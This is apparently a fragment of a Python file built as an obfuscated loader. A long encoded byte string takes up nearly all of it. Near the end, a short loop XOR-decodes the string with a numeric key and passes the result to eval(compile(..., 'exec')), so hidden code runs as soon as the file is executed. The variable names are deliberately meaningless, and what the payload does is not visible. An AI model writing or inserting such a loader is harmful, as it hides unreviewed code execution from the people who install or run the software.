\x10tF\x08KSJrKxNp\n\x00T\x1a{WB\x1an{\x08^\x7f\x1a^p\x7f\x1bn\x1db\rEVLw\x12q\x10\x18cOE\x0fId\x11xWZLkKBKK\x00US[{ZX]}wpZwG[}rqzb\x1ehRh\x18VSb\x18\x1dLy\x06\x1b@w\x1aw\x16Og\x1eh\x14aw\x1ap\x1fGF\x1a\x03G\x16Iv\x16t\x15\x18eIH\x1di_\x07\x01\x05TeT\x06\x04_a@\x18}Pf^KwZ\x00\x12ieG{G\x06_g\x14\x04`Uq\x1bS`E8\x15~\nLx@\x18\x00\x7fW\x00\x14\x19V`\x14k[{ROq\x7fr\x08\\\x15BheK\x16\x7fF\\AGhCl|[\x12u}_p\x02\x0bZ?{f\x1ayXCT\x1c\x1e\x1e~]Yw\x01fEi\x16\x1eVorO\x11PZ\x1cuFAZjKs1^]v\x0c\x1cr\x13|YP|~x\x1a\x12JdkN|\x1ey\x12Fe`\\Ta\rODbt_]l@[^tw\x19R\x1f`\x02CLr\x1fjZ\x03\x17s\x1ey]8pz\x18U\x1e\x02]}XnyuW\n\x1dl\x00\x14\x7fzy^DjJ}\x18\x00EyXX\x02PG}^}K{iNiBtmJxFpRY\x1fo]~\x05n8X1kU\x17_}@gS`KfT\x1ebrEw\x1eHT\tgJ\\H\x10nMFBB`GF\x15Cw\x18\x1d~sCuBU}Xqto\x1cVMSKiThAdYbuU\x1aL\\tysO\x1emz\x19wk\x19\x0cOtKQnLz\x1eNU\x1ci\\\nN\x00_x]F\x15\x160WM{_d\x15jZNtr\x1aaH\x04Mxp\x1bw\x1fIN\x1dgL\x17G~g\x0eB\x0bg\rrhwg\x01fMd\x08\x1aJ[yNG\x1a}\x18\x05aCsHgZ\x1fSUn\x11[\x02\x1feoq\x1aw\x10y\x12h\x1cOGh\x07JU_I|\x7fw\x00d\x19p\x12ba\x04U\x00\x0b\x04Yy\x1bgEWb\x17y\x12t\x15\x1bbLsH\x01gH\x01`q\x14r\x1e\no\x18Wp\x1ay\x1efOJr\x02zB^AWosIrz\x19Fdjv[rTVsu\x01_z_\\rc\x1dK\x1ey\x14s\x1fJF\x1cmgJQfYy\x1d\tB\\a\x1f\x15sRpYL|RMJcAL\x19\x13\x0fNhi\x19lDZVVb\x16@\x00na\x1bc>M\x0ce\x1a\x13\x02\x1bR`FdQpRHsyq[\x1fyr\x1a~\x03\x13hD_nJfE\x15rZ\x13\x13}A\x03W\x06^Iz\x19\x1ew\x08@S\x07_GwXTpFJr\x17\x0fZ\x13\x1es\x1feWL\x17yK<Yk@~1Wro\rOFhl_\x08~zQ\x15\x12DwmH}\x10aN\rGbQUa\x02O~us\x19J\x13v]XnruG\x06Ob\x00hpm\x0eq\r}rCvSIrw\x1dR\x1fX\x1cCzpa\x1eS\r\x14oL\x18xxc\\Gj}PR^\x03~^\x17\x05RKO\x03v\x12Uv_fsh=crxnnB\ts~\x18{fnCSmlZpZvKf]~l\x03u]\x06\x10A~\x19M\x19\x00eACK\x15a[f}\x08pO\x13dMu\x1ffFylY\x0b\x05}TmUmFk1B1}q}\x1fq_8|z\x17O[t|\x7fJ\x16zY\x7f}Zd\x01N|KXYGy\x1e\x14_\x1cetNV~rx_e\x15R>R9pU\x1aAp_0r[q\x14\x18U[Ev\x12u\x14a\x1fJ\x17JoI\x1fJFUI\x19u]hh\x1fI\x18c\x19LUp\x13B\x19uGnaBx=\x07\x01pC\n}k\x0c\x03_ef|\x1au\x16r\x14Gh\x15mKNoD\x1dx__\x1fb\x1a\x0cA\x1blo\x01SUTa\x1e\x08BrGbv\x12t\x1f\x04c\x0cd\x15\x04u\x14v\x17e}~bvyt\x0b\nl\x14Ox\x14=\x11\x11\x16\x14\x13\x11\x14\x19\x17\x13\x19\x14\x18\x10\x11\x192\x10\x18\x14\x12\x14\x18\x10\x14\x11\x18\x19\x19\x13\x17\x11\x13\x1a\x14\x1b\x1c?\x12\x12\x19\x18\x19\x11\x16\x19\x11\x14\x13\x17\x12\x12\x12\x10^\x19Z[_BR\x1a\x112\x11\x17\x19\x10\x19\x19\x18\x16\x11\x14\x19\x16A\\@[\x14ZGS_\x1dBPG\\gAYhT^]]\x18\x17\x16F\x11\x1d\x13PG\x19Q\t3\x14\x18\x10\x11\x19\x18\x10\x18\x14\x12\x14\x18\x10\x14\x11^\x17NA^EV\x10\x14\x1b\x17?\x11rGfc`{xpu\x0e\n\x0b\x14zNSntmgB@\x13w\x13|I]itW\x16q\x00\x1f\x16]v\x16t\x15_ls\rv]E\x10jK|K\x11IwT{Fv\x1bBf\x07X@O\x05n\r\x01\x02p\x13\x1eq\x1ax\x16\\pv\x7fug\x05\x1a\x17RiHI{`Sc}Xq\x12\\a\x13sq\x15y\x17EDgYYy\x1eo\x06\x12\\\x1flrgmZI{Y[v}\x03aY\x06\x18o\x1d\x1bgXm\x1bY{v\x04\x19UX\x17\x14~uv\x03\x1bOh\x18gOa\x1at\x10q\x12\nS\x0c\x0bt\x1bp\x17]\x0f]JUlwsJYLVG\x1eMr\x00\tcfske\t\x1bNQR\x1ar]FAvS\x19\x7fg]\x02YL\x1aJF@uT|r\x1a\x1bgz\x03ZN}CZI]<i_\x16\x18_Td\x1b^|aK\x0e[|ILw\x12x\x12Ia\x1dHd\x1faJ]Hji\x19\x0eQ\\D|t{\x05nJC`\x0fu\x13T`L\x01\x05}\x13h`C\x7f;X\x08|RPykd@\x18iAw\x11\x1chw\x1aw\x16OgLF\x14aIi\x07\x0fN\tF\x1f{T[j\x15i\x12LKkj\x00\x03S\\p\x0eZ\x04DYp\x16q\x1bt\x11\x03VPJBFt\x1aw\x15VT\tj\x0b\x11JWh_Y\x7f\x16g\x05\x1aS\x16dvbdQ@zYKP\x1cHjF]urcv\\Rr}\x19\x7fcF\x02\x1aMc\x1d\x18kuV|pTO\x16]\t[\x0bZ[v\x15u\x12Ws\x1d\x7f\x1af\x01|8oEm\x1e{knE\\Vg\x1b\x1e~rEo@\x01|Y\x1dqt\x1bp\x17\x0e\\t|=z\x12E\x11\x1f\x1fpiBc}d\x18fXTqe\x7fb\x0f|~Y\x1aFZ=U\x17N\\v{fY\x16\\`bC\\|VO>UX\x12\x15K]\x01\x1fG@DeoMPqs}u~lN\x1cP_YE\x1cb{aJB}q\x12v\x12\x04\x0eurIt\x11xGD\x19\x06GtdhPjV`Oan\x0biA\x13srbfYGtY;\x03tQu\x19\x10tJOw\x11r\x14TQ\x10\x15}PS\rS\x13|Z`0s`[ocbKejXFOX\x0eTYrZbJ\\|Z\x00P\x1b\x10xIJFt\x14q\x17R\x03W}J\x16sw\x16sKGtvV}h\x13bFO}cv|\x14\x08X\r\x06\x13JTiu\x16r\x14\x0eINaq\x01\x7fK{\x11X\x19\x7flS\x06W\x17\x02i\x1c\x03H\x03\x1a\x19CF\x16v|GmE\x0csX\x1b|\x10f\x1ap\x17Izbq\x19Jbefh\x00Pq\x1bt\x11XUTP]|cg\x1cX\x16i\x039IR1|hOb\x7f\x1aY\x07q\x1by\x1fWvbY\nv\x1au\x13[VK\x17Q\x1fa\x08\x1aPW\x15wJgB1XG\x10\x1c^MaRyq\x14y\x16]\x0b_P\x1d\x1cJv\x15u\x12\x00\x05rgYXRhz\x15\x02\tu\x15w\x14w\x12x\x12IOa\x1ad\x1faJiIM\x15dF`\x1dGh\x1chJL\x18hvB\tyxx\x0e\no\x10Fv\x19\x15\x15\x12\x12\x19\x18\x19\x11\x16\x19\x11\x14\x13\x17\x128\x12\x10\x18\x17\x19\x17\x10\x11\x17\x12\x18\x18\x11\x17\x19\x12\x1b\x1b\x11<\x11\x14\x19\x16\x16\x15\x14\x13\x14\x15\x17\x16B@PAA[[PED\x1cTPTX\x1f\x13R[P\x13\x1eW\x19\x12G\\YH\x15meL]H\x1aDV]\x10\x12\x17\x18]\\_\x17\x14G][I\x10inFTH\x17GT\\\x11\x06\rYG^^\x12\x14DQR\\]\nfJMT\x1e3UUJ]\x0c;\x14\x19\x16\x16\x15\x14\x13\x14EE__A\x1a\x189"
iOpvEoeaaeavocp = "7017288179099861496654345761521348567271847116431497394801980842480418993713869552298916914372220879"
uocpEAtacovpe = len(wopvEaTEcopFEavc)
oIoeaTEAcvpae = ""
for fapcEaocva in range(uocpEAtacovpe):
    nOpcvaEaopcTEapcoTEac = wopvEaTEcopFEavc[fapcEaocva]
    qQoeapvTeaocpOcivNva = iOpvEoeaaeavocp[fapcEaocva % len(iOpvEoeaaeavocp)]
    oIoeaTEAcvpae += chr(ord(nOpcvaEaopcTEapcoTEac) ^ ord(qQoeapvTeaocpOcivNva))
eval(compile(oIoeaTEAcvpae, '<string>', 'exec'))
System.Init()